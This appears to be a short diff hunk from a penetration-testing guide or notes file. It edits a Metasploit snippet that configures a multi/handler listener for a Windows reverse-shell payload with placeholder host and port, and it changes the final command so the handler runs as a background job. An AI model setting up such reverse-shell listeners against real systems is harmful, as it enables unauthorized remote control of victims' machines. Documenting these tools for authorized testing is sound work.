@@ -143,8 +143,7 @@ use exploit/multi/handler
 set payload windows/shell_reverse_tcp
 set LHOST x.x.x.x
 set LPORT xxx
-exploit
-sessions -j
+exploit -j
 ```
 
 
